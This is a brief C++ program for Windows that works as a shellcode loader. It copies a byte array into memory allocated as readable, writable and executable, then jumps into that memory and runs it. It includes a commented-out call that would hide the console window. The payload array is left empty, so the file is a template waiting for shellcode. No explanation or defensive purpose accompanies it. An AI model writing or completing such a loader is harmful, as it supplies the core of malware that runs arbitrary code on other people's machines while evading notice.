#include <windows.h>
#include <iostream>

using namespace std;

int main(int argc, char **argv)
{
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    unsigned char b[] = {};
    int x;
    unsigned char c[sizeof b];

    cout << "Input: ";
    cin >> x;

    for (int i = 0; i < sizeof b; i++)
    {
        c[i] = b[i];
    }

    void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, c, sizeof c);

    ((void (*)())exec)();
}
